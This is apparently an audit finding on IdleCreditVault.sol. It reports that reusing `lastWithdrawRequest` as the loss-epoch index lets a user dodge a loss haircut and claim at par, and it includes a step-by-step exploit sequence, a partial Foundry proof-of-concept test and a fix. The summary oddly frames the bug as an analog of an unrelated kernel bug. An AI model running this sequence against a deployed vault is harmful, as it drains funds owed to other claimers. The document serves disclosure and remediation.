### Title
Loss-adjusted withdraw receipt escapes its haircut when a later request overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The kernel bug is an off-by-one tail read: a walker dereferences `op[i + 1]` when `i` sits on the last byte, reading past the option area. The credit-vault analog is an epoch boundary read: `_claimLossAdjustedWithdrawRequest` uses the *latest* request marker `lastWithdrawRequest[_user]` as the index into `lossRecoveryPriceByEpoch`, so a user who places a new withdraw request after a loss-adjusted epoch makes the lookup read the wrong (empty) epoch entry and the haircutted receipt is silently paid at par by the funded-claim path — draining funds that belong to other claimers.

### Finding Description
`collectWithdrawFunds` handles a partial funding (`stopEpochWithDuration` loss) by storing `lossRecoveryPriceByEpoch[epochNumber]` and zeroing `pendingWithdraws`, but each user's receipt basis stays in `withdrawsRequests[_user]` / `withdrawsRequestsByEpoch[_user][epoch]` [1](#0-0) .

On claim, `claimWithdrawRequest` routes first to `_claimLossAdjustedWithdrawRequest`, which computes `lossEpoch = lastWithdrawRequest[_user]` and bails out when `lossRecoveryPriceByEpoch[lossEpoch] == 0` [2](#0-1) . `lastWithdrawRequest` is a single slot tracking only the most recent request epoch; a subsequent `requestWithdraw` overwrites it with a later epoch number.

Execution then falls into `_claimFundedWithdrawRequest`, which — once `epochNumber > lastWithdrawRequest[_user]` — pays the *aggregate* `withdrawsRequests[_user]` at par and burns the receipt tokens [3](#0-2) . That aggregate still contains the full pre-haircut basis of the loss-adjusted epoch, because `_clearWithdrawClaimForEpoch` (which would have deducted it) was never reached.

Sequence:
1. Attacker requests a withdraw during epoch N (running). `lastWithdrawRequest[A] = N`, `withdrawsRequestsByEpoch[A][N] = X`, `pendingWithdraws` includes X.
2. Epoch N stops with a realized loss: borrower funds only `funded < pendingBasis`; `lossRecoveryPriceByEpoch[N] = funded * RECOVERY_FULL / pendingBasis < 1`.
3. During the next buffer period (epoch N+1), the attacker calls `requestWithdraw` again (a small amount). `lastWithdrawRequest[A] = N+1`. This is a legitimate unprivileged action; no guard prevents re-requesting with an open receipt — the code comments explicitly allow it ("if a user does not claim... he will have to wait for another epoch").
4. After epoch N+1 ends (epoch N+2 buffer), the attacker claims. `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[N+1] == 0` and returns 0; `_claimFundedWithdrawRequest` pays `withdrawsRequests[A]` in full — including X at par instead of `X * lossRecoveryPrice / RECOVERY_FULL`.

### Impact Explanation
The contract only received `funded` underlyings for the loss-adjusted epoch, yet the attacker withdraws the un-haircutted basis. The excess `(X - X * price / RECOVERY_FULL)` is paid out of the funded reserve that backstops *all* pending and funded receipts, so other users' claims become undercollateralized / revert — direct insolvency proportional to the loss haircut the attacker dodged. With a 50% haircut the attacker steals half of X from the shared reserve.

### Likelihood Explanation
Only requires two ordinary `requestWithdraw` calls straddling a `stopEpochWithDuration` loss epoch — exactly the stressed-epoch scenario where the loss-adjusted path exists. No privileged collusion, no oracle manipulation; `defaultRecoveryInitialized` is already true in any vault that can take a partial funding (`collectWithdrawFunds` reverts otherwise). The single-slot `lastWithdrawRequest` design makes the bug trigger deterministically rather than racily.

### Recommendation
Don't derive the loss epoch from `lastWithdrawRequest`. Iterate/record per-user epochs, or store the loss-adjusted epoch explicitly per user (e.g., `lossAdjustedEpoch[_user]` set at request time or a bitmap), and call `_clearWithdrawClaimForEpoch(_user, lossEpoch)` for that epoch regardless of later requests. Alternatively, apply the haircut eagerly inside `collectWithdrawFunds` by scaling `withdrawsRequestsByEpoch` entries, or revert new `requestWithdraw` calls while the user has an unsettled loss-adjusted receipt.

### Proof of Concept
Foundry fork test (vault in APR0/normal mode with `defaultRecoveryInitialized`):

```solidity
function testLossAdjustedReceiptPaidAtPar() public {
    // epoch N running; attacker (KYC'd lender) deposits and requests withdraw of X
    uint256 tranches = _depositWithUser(attacker, 100e6);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(tranches, address(tranche));   // lastWithdrawRequest[A] = N

    // other users also request so pendingWithdraws > X
    // ... epoch N ends with 50% loss: borrower funds only half of pendingWithdraws
    _stopEpochWithLoss(50); // stopEpochWithDuration -> collectWithdrawFunds(half)
    assertLt(strategy.lossRecoveryPriceByEpoch(N), RECOVERY_FULL);

    // buffer of epoch N+1: attacker files a tiny second request, moving the marker
    uint256 dust = 1;
    deal(address(tranche), attacker, dust, true);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(dust, address(tranche));        // lastWithdrawRequest[A] = N+1

    // epoch N+1 ends normally
    _stopCurrentEpoch();

    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    // BUG: paid full basis X at par; expected X * lossRecoveryPriceByEpoch[N] / RECOVERY_FULL
    uint256 paid = underlying.balanceOf(attacker) - balPre;
    assertGt(paid, expectedHaircuttedAmount, "loss haircut escaped");
}
```

Broken invariant: loss waterfall / one-receipt-one-payout — a receipt priced at `lossRecoveryPriceByEpoch[N]` is redeemed at 1.0 because the epoch lookup reads the "tail" slot (`lastWithdrawRequest`) instead of the epoch that actually carried the loss.

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
